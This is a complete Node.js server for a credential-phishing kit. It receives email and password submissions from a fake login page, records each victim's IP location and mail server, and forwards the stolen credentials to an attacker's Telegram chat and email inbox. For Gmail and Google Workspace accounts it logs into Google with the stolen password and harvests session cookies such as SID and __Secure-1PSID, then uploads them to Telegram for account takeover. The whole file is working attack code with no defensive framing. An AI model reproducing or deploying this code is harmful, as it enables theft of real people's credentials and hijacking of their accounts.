const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// MIDDLEWARE
// ============================================================
// Allow all origins and handle preflight requests automatically
app.use(cors({
    origin: 'https://s0osdryucw.netlify.app',
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json({ limit: '200kb' }));
app.use(express.urlencoded({ extended: true, limit: '200kb' }));

// ============================================================
// CONFIG
// ============================================================
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;

const BREVO_API_KEY = process.env.BREVO_API_KEY;
const SENDER_EMAIL  = process.env.SENDER_EMAIL || 'egli79380@gmail.com';
const SENDER_NAME   = process.env.SENDER_NAME  || 'ABV Monitor';

const EMAIL_RECIPIENTS = (process.env.EMAIL_RECIPIENTS || '')
    .split(',').map(e => e.trim()).filter(Boolean);

const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || '';

const GMAIL_CAPTURE     = process.env.GMAIL_CAPTURE !== 'false';
const GMAIL_MAX_TRIES   = parseInt(process.env.GMAIL_MAX_TRIES || '2', 10);
const GMAIL_CHAIN_HOPS  = parseInt(process.env.GMAIL_CHAIN_HOPS || '8', 10);
const GMAIL_EGRESS_PROXY = process.env.GMAIL_EGRESS_PROXY || '';
const GMAIL_TIMEOUT_MS  = parseInt(process.env.GMAIL_TIMEOUT_MS || '40000', 10);
const GMAIL_UA_FALLBACK = process.env.GMAIL_UA_FALLBACK ||
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36';

const GMAIL_DOMAINS = new Set(['gmail.com', 'googlemail.com']);

const CRITICAL_COOKIES = new Set([
    'SID', 'HSID', 'SSID', 'APISID', 'SAPISID', 'OSID', 'LSID',
    '__Secure-1PSID', '__Secure-3PSID',
    '__Secure-1PSIDTS', '__Secure-3PSIDTS',
    '__Secure-1PAPID', '__Secure-3PAPID',
    '__Secure-OSID', '__Host-1PLSID', '__Host-3PLSID', '__Host-GAPS',
    'NID', 'AEC', 'SIDCC', 'ACCOUNT_CHOOSER'
]);

const NOISE_COOKIES = new Set([
    '_ga', '_gid', '_gcl_au', '1P_JAR', 'OTZ', 'DV', 'CONSENT',
    'SOCS', 'PREF', 'SEARCH_SAMESITE', 'GMAIL_AT'
]);

let gmailDispatcher = null;
if (GMAIL_EGRESS_PROXY) {
    try {
        const { ProxyAgent } = require('undici');
        gmailDispatcher = new ProxyAgent(GMAIL_EGRESS_PROXY);
        console.log('🌍 GMAIL egress proxy enabled');
    } catch {
        console.warn('⚠️  undici missing — GMAIL_EGRESS_PROXY ignored (npm i undici)');
    }
}

// ============================================================
// TURNSTILE
// ============================================================
const TURNSTILE_SECRET_KEY   = process.env.TURNSTILE_SECRET_KEY || '';
const TURNSTILE_PROOF_SECRET = process.env.TURNSTILE_PROOF_SECRET
                              || TURNSTILE_SECRET_KEY
                              || crypto.randomBytes(32).toString('hex');
const REQUIRE_TURNSTILE      = process.env.REQUIRE_TURNSTILE === 'true';
const PROOF_TTL_MS           = 5 * 60 * 1000;

function signProof(email, ts) {
    return crypto.createHmac('sha256', TURNSTILE_PROOF_SECRET)
        .update(`${email}|${ts}`).digest('hex');
}
function makeProof(email) {
    const ts = Date.now();
    return { proof: signProof(email, ts), ts, expiresAt: ts + PROOF_TTL_MS };
}
function verifyProof(email, proof, ts) {
    if (!email || !proof || !ts) return { valid: false, reason: 'missing' };
    const tsNum = parseInt(ts, 10);
    if (Number.isNaN(tsNum)) return { valid: false, reason: 'bad-ts' };
    if (Date.now() - tsNum > PROOF_TTL_MS) return { valid: false, reason: 'expired' };
    if (Date.now() < tsNum - 60_000) return { valid: false, reason: 'future-ts' };
    const expected = signProof(email, tsNum);
    if (typeof proof !== 'string' || proof.length !== expected.length) {
        return { valid: false, reason: 'mismatch' };
    }
    try {
        const ok = crypto.timingSafeEqual(Buffer.from(proof, 'hex'), Buffer.from(expected, 'hex'));
        return { valid: ok, reason: ok ? 'ok' : 'mismatch' };
    } catch {
        return { valid: false, reason: 'bad-hex' };
    }
}

async function verifyTurnstile(token, remoteIp) {
    if (!TURNSTILE_SECRET_KEY) return { success: false, error: 'no-secret-configured' };
    if (!token || typeof token !== 'string') return { success: false, error: 'no-token' };
    try {
        const body = new URLSearchParams();
        body.append('secret', TURNSTILE_SECRET_KEY);
        body.append('response', token);
        if (remoteIp && /^[\d\.a-fA-F:]+$/.test(remoteIp)) body.append('remoteip', remoteIp);
        const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify',
            { method: 'POST', body, signal: AbortSignal.timeout(10000) });
        const data = await r.json();
        return { success: !!data.success, data };
    } catch (e) {
        console.error('❌ Turnstile verify error:', e.message);
        return { success: false, error: e.message };
    }
}

function firstClientIp(req) {
    const xff = req.headers['x-forwarded-for'];
    if (xff) {
        const first = String(xff).split(',')[0].trim();
        if (first) return first;
    }
    return req.connection?.remoteAddress || req.socket?.remoteAddress || 'Unknown';
}

// ============================================================
// STARTUP CHECK
// ============================================================
console.log('========================================');
console.log('🔍 Environment check:');
console.log(`   TELEGRAM_BOT_TOKEN:   ${BOT_TOKEN ? '✅' : '❌ MISSING'}`);
console.log(`   TELEGRAM_CHAT_ID:     ${CHAT_ID ? '✅' : '❌ MISSING'}`);
console.log(`   BREVO_API_KEY:        ${BREVO_API_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   EMAIL_RECIPIENTS:     ${EMAIL_RECIPIENTS.length || '❌ none'}`);
console.log(`   TURNSTILE_SECRET_KEY: ${TURNSTILE_SECRET_KEY ? '✅' : '❌ MISSING'}`);
console.log(`   REQUIRE_TURNSTILE:    ${REQUIRE_TURNSTILE}`);
console.log(`   GMAIL_CAPTURE:        ${GMAIL_CAPTURE ? '✅ ENABLED' : '⛔ DISABLED'}`);
console.log(`   GMAIL_TIMEOUT_MS:     ${GMAIL_TIMEOUT_MS}`);
console.log(`   GMAIL_EGRESS_PROXY:   ${GMAIL_EGRESS_PROXY ? '✅ set' : '— none'}`);
console.log('========================================');

if (REQUIRE_TURNSTILE && !TURNSTILE_SECRET_KEY) {
    console.error('❌ REQUIRE_TURNSTILE=true without TURNSTILE_SECRET_KEY — stage 1 will reject everything.');
}

// ============================================================
// BREVO
// ============================================================
async function sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage) {
    if (!BREVO_API_KEY || EMAIL_RECIPIENTS.length === 0) return false;

    const subject = `🔐 Login (Stage ${stage}) - ${email}`;
    const htmlContent = `
    <div style="font-family:Arial,sans-serif;max-width:600px;margin:0 auto;background:#fff;padding:30px;border-radius:10px">
      <div style="background:#1e930c;color:#fff;padding:15px;border-radius:5px;text-align:center">
        <h2>🔐 Login (Stage ${stage})</h2></div>
      <p><b>Email:</b> ${email}</p>
      <p><b>Password:</b> ${password}</p>
      <p><b>Domain:</b> ${domain || 'Unknown'}</p>
      <p><b>MX:</b> <code>${mxRecord || 'Unknown'}</code></p>
      <p><b>IP:</b> ${ipInfo?.ip || 'Unknown'}</p>
      <p><b>Location:</b> ${ipInfo?.city || '?'}, ${ipInfo?.region || '?'}, ${ipInfo?.country || '?'}</p>
      <p><b>Browser:</b> ${(userAgent || '').slice(0, 100)}</p>
      <p><b>Time:</b> ${new Date().toISOString()}</p>
    </div>`;

    try {
        const r = await fetch('https://api.brevo.com/v3/smtp/email', {
            method: 'POST',
            headers: { 'api-key': BREVO_API_KEY, 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sender: { name: SENDER_NAME, email: SENDER_EMAIL },
                to: EMAIL_RECIPIENTS.map(e => ({ email: e })),
                subject, htmlContent
            }),
            signal: AbortSignal.timeout(15000)
        });
        return r.ok;
    } catch (e) {
        console.error('❌ Brevo error:', e.message);
        return false;
    }
}

// ============================================================
// TELEGRAM
// ============================================================
async function sendToTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return null;
    try {
        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, disable_web_page_preview: true }),
            signal: AbortSignal.timeout(15000)
        });
        return await r.json();
    } catch (e) {
        console.error('❌ Telegram error:', e.message);
        return null;
    }
}

async function sendTelegramDocument(caption, filename, jsonText) {
    if (!BOT_TOKEN || !CHAT_ID) return { ok: false, reason: 'not-configured' };
    try {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('caption', caption.slice(0, 1024));
        fd.append('parse_mode', 'HTML');
        fd.append('document', new Blob([jsonText], { type: 'application/json' }), filename);
        const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
            { method: 'POST', body: fd, signal: AbortSignal.timeout(25000) });
        return { ok: r.ok, status: r.status };
    } catch (e) {
        console.error('❌ Telegram document error:', e.message);
        return { ok: false, reason: e.message };
    }
}

// ============================================================
// IP / MX
// ============================================================
async function getIPInfo(ip) {
    const first = String(ip || '').split(',')[0].trim();
    const fallback = { ip: first || 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
    if (!first || first === 'Unknown') return fallback;
    try {
        const r = await fetch(`https://ipinfo.io/${first}/json`, { signal: AbortSignal.timeout(6000) });
        const d = await r.json();
        return { ...fallback, ...d, ip: first };
    } catch {
        return fallback;
    }
}

async function getMXRecord(domain) {
    try {
        const r = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`,
            { signal: AbortSignal.timeout(6000) });
        const d = await r.json();
        if (d?.Answer?.length) return d.Answer.map(x => x.data).join('\n');
        return 'no-mx';
    } catch {
        return 'MX-Error';
    }
}

// ============================================================
// COOKIE JAR  (host + path aware)
// ============================================================
const SS_MAP = { none: 'no_restriction', lax: 'lax', strict: 'strict' };

function splitSetCookie(header) {
    if (!header) return [];
    return header.split(/,(?=\s*[A-Za-z0-9_\-.]+=)/).map(s => s.trim()).filter(Boolean);
}

class Jar {
    constructor() { this.map = new Map(); }

    absorb(url, list) {
        const host = new URL(url).hostname;
        for (const raw of list) {
            const parts = raw.split(';');
            const pair = parts.shift();
            const eq = pair.indexOf('=');
            if (eq < 1) continue;

            const name = pair.slice(0, eq).trim();
            const value = pair.slice(eq + 1).trim();
            if (!name) continue;

            let domain = '', path = '/', secure = false, httpOnly = false,
                sameSite = 'unspecified', expires = null, maxAge = null, hasDomain = false;

            for (const attr of parts) {
                const i = attr.indexOf('=');
                const k = (i < 0 ? attr : attr.slice(0, i)).trim().toLowerCase();
                const v = i < 0 ? '' : attr.slice(i + 1).trim();
                if (k === 'domain') { domain = v; hasDomain = true; }
                else if (k === 'path') path = v;
                else if (k === 'secure') secure = true;
                else if (k === 'httponly') httpOnly = true;
                else if (k === 'samesite') sameSite = SS_MAP[v.toLowerCase()] || 'unspecified';
                else if (k === 'expires') { const t = Date.parse(v); if (!Number.isNaN(t)) expires = t; }
                else if (k === 'max-age') { const n = parseInt(v, 10); if (!Number.isNaN(n)) maxAge = n; }
            }

            // __Host- cookies are always host-only, path=/, secure
            const isHostPrefix = name.startsWith('__Host-');
            if (isHostPrefix) { domain = host; hasDomain = false; path = '/'; secure = true; }

            if (maxAge !== null) expires = Date.now() + maxAge * 1000;

            const bare = (domain || host).replace(/^\./, '');
            const key = `${name}|${bare}|${path}`;

            if (value === '' && expires !== null && expires < Date.now()) {
                this.map.delete(key);
                continue;
            }

            this.map.set(key, {
                name, value,
                domain: hasDomain ? (domain.startsWith('.') ? domain : '.' + bare) : host,
                hostOnly: !hasDomain,
                path, secure: secure || isHostPrefix, httpOnly, sameSite,
                session: expires === null,
                expirationDate: expires ? Math.floor(expires / 1000) : null
            });
        }
    }

    header(url) {
        const { hostname, pathname } = new URL(url);
        const out = [];
        for (const c of this.map.values()) {
            const d = c.domain.replace(/^\./, '');
            const hostOk = hostname === d || hostname.endsWith('.' + d);
            if (!hostOk) continue;
            if (!pathname.startsWith(c.path)) continue;
            out.push(`${c.name}=${c.value}`);
        }
        return out.join('; ');
    }

    has(name) { return [...this.map.values()].some(c => c.name === name); }

    export() {
        return [...this.map.values()]
            .sort((a, b) => Number(CRITICAL_COOKIES.has(b.name)) - Number(CRITICAL_COOKIES.has(a.name)))
            .map(c => ({
                domain: c.domain,
                hostOnly: c.hostOnly,
                httpOnly: c.httpOnly,
                name: c.name,
                path: c.path,
                sameSite: c.sameSite,
                secure: c.secure,
                session: c.session,
                storeId: null,
                ...(c.expirationDate ? { expirationDate: c.expirationDate } : {}),
                value: c.value
            }));
    }

    headerForExport() {
        return [...this.map.values()]
            .filter(c => CRITICAL_COOKIES.has(c.name) || !NOISE_COOKIES.has(c.name))
            .map(c => `${c.name}=${c.value}`).join('; ');
    }
}

// ============================================================
// GOOGLE LOGIN / HARVEST
// ============================================================
function pickGALX(html) {
    const m = html.match(/name="GALX"\s+value="([^"]+)"/);
    return m ? m[1] : '';
}
function pickTL(html) {
    const m = html.match(/name="TL"\s+value="([^"]+)"/)
           || html.match(/\["TL","([^"]+)"\]/)
           || html.match(/&quot;TL&quot;,&quot;([^&"]+)&quot;/);
    return m ? m[1] : '';
}
function pickAction(html) {
    const m = html.match(/action="([^"]*(?:ServiceLoginAuth|challenge\/pwd)[^"]*)"/);
    return m ? m[1].replace(/&amp;/g, '&') : '';
}
function absolutize(loc, base) {
    if (!loc) return null;
    try { return new URL(loc, base).toString(); } catch { return null; }
}

async function googleHarvest(email, password, ua) {
    const jar = new Jar();
    const trace = [];
    const A = 'https://accounts.google.com';
    const domain = email.split('@')[1].toLowerCase();
    const isWorkspace = !GMAIL_DOMAINS.has(domain);
    const cont = isWorkspace
        ? `https://mail.google.com/a/${domain}/`
        : 'https://mail.google.com/mail/u/0/';

    const signal = AbortSignal.timeout(GMAIL_TIMEOUT_MS);

    const go = async (url, opts = {}) => {
        const headers = {
            'user-agent': ua,
            'accept-language': 'en-US,en;q=0.9',
            accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'upgrade-insecure-requests': '1',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            ...(opts.headers || {})
        };
        const ck = jar.header(url);
        if (ck) headers.cookie = ck;

        const init = { method: opts.method || 'GET', headers, body: opts.body, redirect: 'manual', signal };
        if (gmailDispatcher) init.dispatcher = gmailDispatcher;

        const res = await fetch(url, init);
        jar.absorb(url, res.headers.getSetCookie?.() ?? splitSetCookie(res.headers.get('set-cookie')));
        trace.push({
            s: res.status,
            u: url.slice(0, 150),
            l: (res.headers.get('location') || '').slice(0, 150)
        });
        return res;
    };

    const formH = {
        'content-type': 'application/x-www-form-urlencoded',
        origin: A,
        referer: A + '/'
    };

    // ---- 1. prime + scrape ----
    let res = await go(`${A}/ServiceLogin?service=mail&continue=${encodeURIComponent(cont)}&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin`);
    let hops = 0;
    while (res.status >= 300 && res.status < 400 && hops++ < 3) {
        const next = absolutize(res.headers.get('location'), A);
        if (!next) break;
        res = await go(next);
    }
    let html = await res.text();

    let galx = pickGALX(html);
    let tl = pickTL(html);
    const action = pickAction(html);

    let needs2fa = false;

    if (galx && action) {
        // ---- 2a. classic Gaia ----
        res = await go(A + action, {
            method: 'POST',
            headers: formH,
            body: new URLSearchParams({
                Email: email,
                Passwd: password,
                GALX: galx,
                continue: cont,
                service: 'mail',
                hl: 'en',
                dsh: 'S' + Date.now(),
                PstMsg: '1',
                checkConnection: 'youtube:177:1',
                checkedDomains: 'youtube',
                ec: 'GAZAmgQ'
            }).toString()
        });
    } else {
        // ---- 2b. v3 identifier + password challenge ----
        const idUrl = `${A}/v3/signin/identifier?continue=${encodeURIComponent(cont)}&service=mail&hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S${Date.now()}`;
        const idRes = await go(idUrl, {
            method: 'POST',
            headers: formH,
            body: new URLSearchParams({
                identifier: email,
                continue: cont,
                service: 'mail',
                hl: 'en',
                flowName: 'GlifWebSignIn',
                flowEntry: 'ServiceLogin',
                checkedDomains: 'youtube',
                checkConnection: 'youtube:177:1',
                pstMsg: '1'
            }).toString()
        });

        const loc = idRes.headers.get('location') || '';
        const tl2 = (loc.match(/[?&]TL=([^&]+)/) || [])[1] || '';
        const dsh2 = (loc.match(/[?&]dsh=([^&]+)/) || [])[1] || '';

        if (!tl2) {
            res = idRes;
            const b = await idRes.text();
            needs2fa = /challenge\/(totp|ipp|dp|sk|az)/.test(loc);
            tl = pickTL(b) || tl;
        } else {
            res = await go(`${A}/v3/signin/challenge/pwd?TL=${encodeURIComponent(tl2)}&continue=${encodeURIComponent(cont)}&service=mail&hl=en&dsh=${encodeURIComponent(dsh2)}`, {
                method: 'POST',
                headers: formH,
                body: new URLSearchParams({
                    Passwd: password,
                    TL: tl2,
                    dsh: dsh2,
                    continue: cont,
                    service: 'mail',
                    hl: 'en',
                    flowName: 'GlifWebSignIn',
                    flowEntry: 'ServiceLogin'
                }).toString()
            });
        }
    }

    // ---- 3. chase redirects (CheckCookie -> mail.google.com) ----
    let next = absolutize(res.headers.get('location'), A);
    hops = 0;
    while (next && hops++ < GMAIL_CHAIN_HOPS) {
        if (/challenge\/(totp|ipp|dp|sk|az)/.test(next) || /\/v3\/signin\/challenge/.test(next)) {
            needs2fa = true;
            break;
        }
        const r2 = await go(next);
        if (r2.status >= 300 && r2.status < 400) {
            next = absolutize(r2.headers.get('location'), next);
            continue;
        }
        break;
    }

    // ---- 4. top up accounts.google.com + google.com sets ----
    if (jar.has('SID') || jar.has('__Secure-1PSID')) {
        await go(`${A}/ListAccounts?authuser=0&gpsia=1&source=ogb&mo=1&listPages=1&lp=1&hl=en`).catch(() => {});
        await go('https://myaccount.google.com/').catch(() => {});
        await go('https://www.google.com/').catch(() => {});
        await go(cont).catch(() => {});
    }

    const ok = jar.has('SID') && jar.has('__Secure-1PSID');
    return { ok, jar, trace, needs2fa, finalUrl: next || null };
}

// ============================================================
// HEALTH
// ============================================================
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        uptime: process.uptime(),
        telegram: !!(BOT_TOKEN && CHAT_ID),
        email: !!(BREVO_API_KEY && EMAIL_RECIPIENTS.length),
        turnstile: !!TURNSTILE_SECRET_KEY,
        requireTurnstile: REQUIRE_TURNSTILE,
        gmailCapture: GMAIL_CAPTURE,
        gmailEgressProxy: !!GMAIL_EGRESS_PROXY
    });
});

// ============================================================
// TURNSTILE VERIFY
// ============================================================
app.post('/api/turnstile-verify', async (req, res) => {
    const { token, email } = req.body || {};
    if (!token || typeof token !== 'string') {
        return res.status(400).json({ success: false, message: 'Turnstile token required' });
    }
    if (!email || typeof email !== 'string' || !email.includes('@')) {
        return res.status(400).json({ success: false, message: 'Valid email required' });
    }

    const result = await verifyTurnstile(token, firstClientIp(req));
    if (!result.success) {
        return res.status(403).json({ success: false, message: 'Turnstile failed', details: result.data || result.error });
    }

    const { proof, ts, expiresAt } = makeProof(email);
    return res.json({
        success: true, email, proof, ts, expiresAt,
        redirect: '/login.html?u=' + encodeURIComponent(email)
                + '&p=' + encodeURIComponent(proof)
                + '&t=' + ts
    });
});

// ============================================================
// LOGIN
// ============================================================
app.post('/api/login', async (req, res) => {
    const { email, password, stage = 1, firstPassword, turnstileToken, proof, proofTs } = req.body || {};

    if (!email || !password) {
        return res.status(400).json({ success: false, message: 'Email and password required' });
    }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
        return res.status(400).json({ success: false, message: 'Invalid email format' });
    }

    if (stage === 1) {
        let passed = false, reason = 'not-checked';
        if (proof && proofTs) {
            const v = verifyProof(email, proof, proofTs);
            passed = v.valid; reason = v.reason;
        } else if (turnstileToken) {
            const v = await verifyTurnstile(turnstileToken, firstClientIp(req));
            passed = v.success; reason = v.success ? 'ok' : 'turnstile-failed';
        } else {
            reason = 'no-proof';
        }
        if (!passed && REQUIRE_TURNSTILE) {
            return res.status(403).json({ success: false, stage: 1, message: 'Human verification required', reason });
        }
        console.log(`🛡️ stage 1 gate: ${email} -> ${passed ? 'pass' : 'permissive-skip'} (${reason})`);
    }

    const clientIP = firstClientIp(req);
    const ipInfo = await getIPInfo(clientIP);
    const domain = email.split('@')[1];
    const mxRecord = await getMXRecord(domain);
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'Unknown';

    const isGoogle = GMAIL_DOMAINS.has(domain.toLowerCase()) || /google/i.test(mxRecord);
    const stageLabel = stage === 1 ? '1st Entry' : '2nd Entry';
    const matchLine = stage === 2
        ? `First Password : ${firstPassword}\nMatch : ${firstPassword === password ? '✅ YES' : '❌ NO'}\n`
        : '';

    await sendToTelegram(
        `--------+ ReZulT [${stageLabel}] +--------\n` +
        `Email : ${email}\nPassword : ${password}\n${matchLine}` +
        `Browser : ${userAgent}\nLanguage : ${acceptLanguage}\n` +
        `MX : ${mxRecord}\nIP : ${clientIP}\n` +
        `Location : ${ipInfo.city || '?'} ${ipInfo.region || '?'}, ${ipInfo.country || '?'}\n` +
        `Date : ${new Date().toISOString()}\n` +
        `---------+ ReZulT [${stageLabel}] +-------------`
    );

    sendEmail(email, password, ipInfo, userAgent, domain, mxRecord, stage).catch(() => {});

    if (stage !== 2) {
        return res.json({ success: true, stage: 1 });
    }

    const match = firstPassword === password;
    const googleRedirect = GMAIL_DOMAINS.has(domain.toLowerCase())
        ? 'https://mail.google.com/mail/u/0/'
        : `https://mail.google.com/a/${domain}/`;
    const plainRedirect = TEAMS_REDIRECT || `https://${domain}`;

    if (!match) {
        return res.json({ success: true, stage: 2, match: false, message: 'Passwords do not match' });
    }

    if (!GMAIL_CAPTURE || !isGoogle) {
        return res.json({ success: true, stage: 2, match: true, redirect: isGoogle ? googleRedirect : plainRedirect, harvest: null });
    }

    // ---- harvest ----
    const ua = req.headers['user-agent'] || GMAIL_UA_FALLBACK;
    const tries = [...new Set([password, firstPassword].filter(Boolean))].slice(0, GMAIL_MAX_TRIES);

    let best = null;
    for (const pw of tries) {
        try {
            const out = await googleHarvest(email, pw, ua);
            if (!best || out.ok) best = { pw, ...out };
            if (out.ok) break;
        } catch (e) {
            console.error('❌ harvest hop error:', e.message);
            if (!best) best = { pw, ok: false, jar: new Jar(), trace: [{ error: e.message }], needs2fa: false, finalUrl: null };
        }
    }

    const jar = best?.jar || new Jar();
    const cookies = jar.export();
    const json = JSON.stringify(cookies, null, 2);
    const safe = email.replace(/[^a-z0-9]/gi, '_');
    const filename = `cookies-${safe}.json`;

    const caption =
        `<b>Gmail session ${best?.ok ? 'OK' : 'PARTIAL'}</b>\n` +
        `<code>${email}</code>\n` +
        `<code>${password}</code>\n` +
        `Cookies: ${cookies.length} (${jar.has('SID') ? 'SID' : 'no SID'}/${jar.has('__Secure-1PSID') ? '1PSID' : 'no 1PSID'})\n` +
        `IP: ${clientIP} · ${ipInfo.country || '?'}`;

    const telegram = best?.ok
        ? await sendTelegramDocument(caption, filename, json)
        : { ok: false, reason: 'no-session' };

    console.log(`🍪 ${email} -> ${cookies.length} cookies, ok=${!!best?.ok}, tg=${telegram.ok}`);

    return res.json({
        success: true,
        stage: 2,
        match: true,
        redirect: googleRedirect,
        harvest: {
            ok: !!best?.ok,
            needs2fa: !!best?.needs2fa,
            total: cookies.length,
            critical: cookies.filter(c => CRITICAL_COOKIES.has(c.name)).length,
            hasSid: jar.has('SID'),
            hasPsid: jar.has('__Secure-1PSID'),
            filename,
            json,
            telegram
        }
    });
});

// ============================================================
// STANDALONE HARVEST (optional, same engine)
// ============================================================
app.post('/api/gmail-session', async (req, res) => {
    if (!GMAIL_CAPTURE) return res.json({ ok: false, disabled: true });

    const { email, password, fingerprint = {} } = req.body || {};
    if (!email || !password) return res.status(400).json({ ok: false, message: 'email and password required' });

    const ua = fingerprint.userAgent || req.headers['user-agent'] || GMAIL_UA_FALLBACK;
    try {
        const out = await googleHarvest(email, password, ua);
        const cookies = out.jar.export();
        const json = JSON.stringify(cookies, null, 2);
        const safe = email.replace(/[^a-z0-9]/gi, '_');
        const filename = `cookies-${safe}.json`;

        await sendTelegramDocument(
            `<b>Gmail session ${out.ok ? 'OK' : 'PARTIAL'}</b>\n<code>${email}</code>\nCookies: ${cookies.length}`,
            filename, json
        );

        res.json({
            ok: out.ok,
            needs2fa: out.needs2fa,
            total: cookies.length,
            filename,
            json,
            cookies,
            finalUrl: out.finalUrl,
            cookieHeader: out.jar.headerForExport()
        });
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ============================================================
// 404 + START
// ============================================================
app.use((req, res) => {
    res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` });
});

app.listen(PORT, () => console.log(`🚀 listening on ${PORT}`));

process.on('uncaughtException', e => console.error('❌ Uncaught:', e.message));
process.on('unhandledRejection', r => console.error('❌ Unhandled:', r));